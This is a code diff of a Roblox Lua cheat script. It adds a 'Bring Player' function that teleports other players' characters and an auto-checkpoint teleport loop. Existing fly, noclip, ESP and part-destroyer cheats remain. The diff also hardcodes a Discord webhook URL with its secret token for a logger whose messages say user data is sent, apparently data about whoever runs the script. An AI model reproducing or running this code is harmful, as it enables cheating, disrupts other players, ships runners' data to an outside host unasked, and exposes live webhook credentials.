@@ -7,7 +7,7 @@ task.wait(0.5)
 -- ============================================
 -- WEBHOOK CONFIGURATION
 -- ============================================
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1427153216331710497/4IE4Ewyodu2eI5iG5OGIy7q9oly7_GsjsYuEz5ymwtVWuns5iNPcIrSaFztlktZ8lMxs" -- GANTI INI DENGAN WEBHOOK DISCORD ANDA!
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1427156897697632376/GXLU8ZzQx9VeFk6PxIqO9nD9Rs_GbPe0YAxDLNU577KscYshS3rA3P6tF-TPfO6q9lZf"
 
 -- ============================================
 -- WEBHOOK LOGGER FUNCTION
@@ -132,7 +132,8 @@ local settings = {
     fullbrightEnabled = false,
     infJumpEnabled = false,
     isMinimized = false,
-    destroyRange = 10
+    destroyRange = 10,
+    autoCheckpointEnabled = false
 }
 
 -- Cleanup old GUI
@@ -149,8 +150,8 @@ gui.Parent = plr.PlayerGui
 
 -- Main Frame
 local main = Instance.new("Frame")
-main.Size = UDim2.new(0, 420, 0, 580)
-main.Position = UDim2.new(0.5, -210, 0.5, -290)
+main.Size = UDim2.new(0, 420, 0, 640)
+main.Position = UDim2.new(0.5, -210, 0.5, -320)
 main.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
 main.BorderSizePixel = 0
 main.Active = true
@@ -235,7 +236,7 @@ scroll.Position = UDim2.new(0, 10, 0, 0)
 scroll.BackgroundTransparency = 1
 scroll.BorderSizePixel = 0
 scroll.ScrollBarThickness = 6
-scroll.CanvasSize = UDim2.new(0, 0, 0, 1200)
+scroll.CanvasSize = UDim2.new(0, 0, 0, 1350)
 scroll.Parent = contentFrame
 
 -- Helper function for buttons
@@ -345,11 +346,20 @@ y = y + 55
 local platformBtn = createButton("PlatformBtn", "Platform: OFF", UDim2.new(0, 5, 0, y), function() end)
 y = y + 55
 
--- TELEPORT SECTION
-createLabel("📍 TELEPORT", UDim2.new(0, 5, 0, y))
+-- TELEPORT SECTION (EXPANDED!)
+createLabel("📍 TELEPORT & BRING", UDim2.new(0, 5, 0, y))
 y = y + 30
 local tpBox = createTextBox("TpBox", "Player Name", UDim2.new(0, 5, 0, y))
 local tpBtn = createButton("TpBtn", "Goto Player", UDim2.new(0, 205, 0, y), function() end)
+y = y + 55
+
+local bringBox = createTextBox("BringBox", "Player Name", UDim2.new(0, 5, 0, y))
+local bringBtn = createButton("BringBtn", "Bring Player", UDim2.new(0, 205, 0, y), function() end)
+bringBtn.BackgroundColor3 = Color3.fromRGB(65, 45, 90)
+y = y + 55
+
+local autoCheckpointBtn = createButton("AutoCheckpointBtn", "Auto Checkpoint: OFF", UDim2.new(0, 5, 0, y), function() end)
+autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(45, 65, 90)
 y = y + 55
 
 -- VISUAL SECTION
@@ -359,7 +369,7 @@ local espBtn = createButton("EspBtn", "ESP: OFF", UDim2.new(0, 5, 0, y), functio
 local fbBtn = createButton("FbBtn", "Fullbright: OFF", UDim2.new(0, 205, 0, y), function() end)
 y = y + 55
 
--- DESTROYER SECTION (NEW!)
+-- DESTROYER SECTION
 createLabel("💥 PART DESTROYER (TESTING)", UDim2.new(0, 5, 0, y))
 y = y + 30
 local rangeBox = createTextBox("RangeBox", "Range (10)", UDim2.new(0, 5, 0, y))
@@ -392,22 +402,89 @@ local function toggleMinimize()
     settings.isMinimized = not settings.isMinimized
     
     local targetSize
-    local targetPos
     
     if settings.isMinimized then
         targetSize = UDim2.new(0, 420, 0, 60)
-        targetPos = main.Position
         minBtn.Text = "□"
         contentFrame.Visible = false
     else
-        targetSize = UDim2.new(0, 420, 0, 580)
-        targetPos = main.Position
+        targetSize = UDim2.new(0, 420, 0, 640)
         minBtn.Text = "—"
         contentFrame.Visible = true
     end
     
     local tween = TS:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = targetSize})
     tween:Play()
+end
+
+-- BRING PLAYER FUNCTION (NEW!)
+local function bringPlayer()
+    local name = bringBox.Text:lower()
+    if name == "" then
+        updateStatus("Enter player name to bring!", Color3.fromRGB(255, 100, 100))
+        return
+    end
+    
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= plr and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+            if p.Name:lower():find(name) or p.DisplayName:lower():find(name) then
+                -- Bring target player to you
+                local targetRoot = p.Character.HumanoidRootPart
+                local oldCFrame = targetRoot.CFrame
+                
+                -- Teleport them to you
+                targetRoot.CFrame = root.CFrame + Vector3.new(0, 0, -3)
+                
+                updateStatus("Brought " .. p.Name .. " to you!", Color3.fromRGB(255, 200, 0))
+                return
+            end
+        end
+    end
+    updateStatus("Player not found!", Color3.fromRGB(255, 100, 100))
+end
+
+-- AUTO CHECKPOINT TELEPORT (NEW!)
+local autoCheckpointConnection
+local function toggleAutoCheckpoint()
+    settings.autoCheckpointEnabled = not settings.autoCheckpointEnabled
+    
+    if settings.autoCheckpointEnabled then
+        autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(50, 220, 50)
+        autoCheckpointBtn.Text = "Auto Checkpoint: ON ✓"
+        updateStatus("Auto teleporting to Checkpoints!", Color3.fromRGB(50, 220, 50))
+        
+        autoCheckpointConnection = RS.Heartbeat:Connect(function()
+            if not settings.autoCheckpointEnabled then return end
+            
+            -- Find nearest checkpoint
+            local nearestCheckpoint = nil
+            local shortestDistance = math.huge
+            
+            for _, obj in pairs(workspace:GetDescendants()) do
+                if obj:IsA("BasePart") and obj.Name == "Checkpoint" then
+                    local distance = (obj.Position - root.Position).Magnitude
+                    if distance < shortestDistance and distance > 5 then -- Ignore if too close
+                        shortestDistance = distance
+                        nearestCheckpoint = obj
+                    end
+                end
+            end
+            
+            -- Teleport to nearest checkpoint if found
+            if nearestCheckpoint and shortestDistance < 100 then -- Within 100 studs
+                root.CFrame = nearestCheckpoint.CFrame + Vector3.new(0, 5, 0)
+            end
+        end)
+    else
+        autoCheckpointBtn.BackgroundColor3 = Color3.fromRGB(45, 65, 90)
+        autoCheckpointBtn.Text = "Auto Checkpoint: OFF"
+        updateStatus("Auto Checkpoint disabled", Color3.fromRGB(200, 200, 200))
+        
+        if autoCheckpointConnection then 
+            autoCheckpointConnection:Disconnect()
+            autoCheckpointConnection = nil
+        end
+    end
 end
 
 -- PART DESTROYER FUNCTIONS
@@ -468,7 +545,7 @@ local function deleteModel()
     end
 end
 
--- FLY SYSTEM (Metland Optimized - FIXED)
+-- FLY SYSTEM
 local flyBV, flyBG, flyConnection
 local function toggleFly()
     settings.flyEnabled = not settings.flyEnabled
@@ -478,21 +555,18 @@ local function toggleFly()
         flyBtn.Text = "Fly: ON ✓"
         updateStatus("Fly enabled! Use WASD + Space/Shift", Color3.fromRGB(50, 220, 50))
         
-        -- Clean up old instances
         for _, v in pairs(root:GetChildren()) do
             if v:IsA("BodyVelocity") or v:IsA("BodyGyro") then
                 v:Destroy()
             end
         end
         
-        -- Create BodyVelocity
         flyBV = Instance.new("BodyVelocity")
         flyBV.Name = "FlyVel"
         flyBV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
         flyBV.Velocity = Vector3.new(0, 0, 0)
         flyBV.Parent = root
         
-        -- Create BodyGyro
         flyBG = Instance.new("BodyGyro")
         flyBG.Name = "FlyGyro"
         flyBG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
@@ -500,7 +574,6 @@ local function toggleFly()
         flyBG.CFrame = root.CFrame
         flyBG.Parent = root
         
-        -- Fly loop
         flyConnection = RS.Heartbeat:Connect(function()
             if not settings.flyEnabled then return end
             if not root or not root.Parent then 
@@ -514,7 +587,6 @@ local function toggleFly()
             
             local move = Vector3.new(0, 0, 0)
             
-            -- Movement input
             if UIS:IsKeyDown(Enum.KeyCode.W) then
                 move = move + (cam.CFrame.LookVector * Vector3.new(1, 0, 1)).Unit
             end
@@ -534,17 +606,13 @@ local function toggleFly()
                 move = move - Vector3.new(0, 1, 0)
             end
             
-            -- Apply velocity
             if move.Magnitude > 0 then
                 flyBV.Velocity = move.Unit * speed
             else
                 flyBV.Velocity = Vector3.new(0, 0, 0)
             end
             
-            -- Update rotation
             flyBG.CFrame = cam.CFrame
-            
-            -- Prevent falling
             hum.PlatformStand = true
             root.Velocity = flyBV.Velocity
         end)
@@ -568,7 +636,6 @@ local function toggleFly()
         
         hum.PlatformStand = false
         
-        -- Reset velocity
         if root then
             root.Velocity = Vector3.new(0, 0, 0)
             root.RotVelocity = Vector3.new(0, 0, 0)
@@ -856,6 +923,8 @@ noclipBtn.MouseButton1Click:Connect(toggleNoclip)
 antiVoidBtn.MouseButton1Click:Connect(toggleAntiVoid)
 platformBtn.MouseButton1Click:Connect(togglePlatform)
 tpBtn.MouseButton1Click:Connect(tpToPlayer)
+bringBtn.MouseButton1Click:Connect(bringPlayer)
+autoCheckpointBtn.MouseButton1Click:Connect(toggleAutoCheckpoint)
 espBtn.MouseButton1Click:Connect(toggleESP)
 fbBtn.MouseButton1Click:Connect(toggleFullbright)
 
@@ -875,6 +944,7 @@ closeBtn.MouseButton1Click:Connect(function()
     if platformConnection then platformConnection:Disconnect() end
     if platform then platform:Destroy() end
     if infJumpConnection then infJumpConnection:Disconnect() end
+    if autoCheckpointConnection then autoCheckpointConnection:Disconnect() end
     removeESP()
     gui:Destroy()
     updateStatus("Closed", Color3.fromRGB(255, 100, 100))
@@ -891,10 +961,12 @@ plr.CharacterAdded:Connect(function(newChar)
     settings.flyEnabled = false
     settings.noclipEnabled = false
     settings.platformEnabled = false
+    settings.autoCheckpointEnabled = false
     
     if flyConnection then flyConnection:Disconnect() end
     if noclipConnection then noclipConnection:Disconnect() end
     if platformConnection then platformConnection:Disconnect() end
+    if autoCheckpointConnection then autoCheckpointConnection:Disconnect() end
 end)
 
 -- Keybind to toggle GUI (Right Shift)
@@ -917,5 +989,5 @@ end)
 updateStatus("Enhanced testing suite ready! Data logged 📡", Color3.fromRGB(0, 255, 255))
 print("✅ METLANDGG ENHANCED LOADED")
 print("📡 Webhook logger active - User data sent!")
-print("📌 Features: Minimize (RightShift), Part Destroyer, Model Deleter")
+print("📌 Features: Minimize (RightShift), Bring Player, Auto Checkpoint")
 print("⚠️ WARNING: Destroy functions are for testing only!")
